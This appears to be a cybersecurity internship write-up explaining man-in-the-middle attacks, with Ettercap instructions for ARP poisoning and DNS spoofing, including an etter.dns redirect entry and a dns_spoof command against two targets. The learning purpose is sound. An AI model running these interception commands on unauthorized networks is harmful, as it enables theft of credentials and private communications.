# Man-in-the-Middle (MITM) Attack - Task 9

**Date:** 24 August 2025  
**Internship Program:** Cybersecurity Internship – UJAR TECH  

---

## Overview
A **Man-in-the-Middle (MITM) attack** is a cyberattack in which an attacker secretly intercepts and possibly alters communication between two parties.  
The attacker positions themselves between the victim and the service, enabling them to steal **sensitive information** such as:
- Login credentials  
- Credit card numbers  
- Account details  
- Personal communications  

Alternative names:  
- **Machine-in-the-Middle**  
- **On-Path Attack**  
- **Adversary-in-the-Middle (AITM)**  
- **Manipulator-in-the-Middle**  
---

## How Does a MITM Attack Work?
MITM attackers exploit weaknesses in:
- Networks (especially public Wi-Fi)  
- Web browsers  
- Email accounts  
- Weak security protocols  
- User behavior (phishing, clicking malicious links)  

Attack workflow:
1. **Interception** → Attacker inserts themselves between two communicating parties.  
2. **Decryption** → Captured encrypted data is cracked using stolen keys, brute-force, or spoofing techniques.  

---

## MITM Attack Techniques
- **IP Spoofing** → Altering IP addresses to appear as a trusted host.  
- **ARP Spoofing** → Mapping a legitimate IP address to a malicious MAC address.  
- **DNS Spoofing** → Redirecting domain requests to a fake/malicious server.  
- **HTTPS Spoofing** → Downgrading HTTPS connections to HTTP.  
- **SSL Hijacking** → Using fake SSL certificates to intercept traffic.  
- **SSL Stripping** → Forcing traffic from HTTPS → HTTP during transitions.  

---

##  Ettercap for MITM Attacks
**Ettercap** is a powerful suite for conducting MITM attacks.  
It supports both **active and passive dissection of protocols** and provides features for network and host analysis.

###  Installation
On Kali Linux:
```bash
sudo apt-get install ettercap-graphical
```

Performing ARP Poisoning with Ettercap

    Start Ettercap in GUI mode:
```bash
    sudo ettercap -G
```
    Select your network interface (e.g., eth0, wlan0).
```bash
    Go to Sniff → Unified Sniffing.

    Discover devices: Hosts → Scan for hosts.

    View them: Hosts → Host List.

    Select Target 1 and Target 2.

    Start MITM attack: Mitm → ARP Poisoning → Enable Sniff Remote Connections.

    Begin sniffing: Start → Start Sniffing.
```
Always stop the attack after testing and ensure you have authorization.
Performing DNS Spoofing with Ettercap
    Edit the DNS configuration file:
```bash
sudo nano /etc/ettercap/etter.dns
```
Add entry:
```url
www.example.com A 192.168.x.x
(replace 192.168.x.x with attacker’s IP).
```
Run Ettercap with DNS spoofing:

```bash
    sudo ettercap -T -q -i [interface] -P dns_spoof -M arp:remote /target1// /target2//
```
[References](https://github.com/sarojdsoka/Cybersecurity-Internship-UJAR/blob/main/REFERENCES.md)
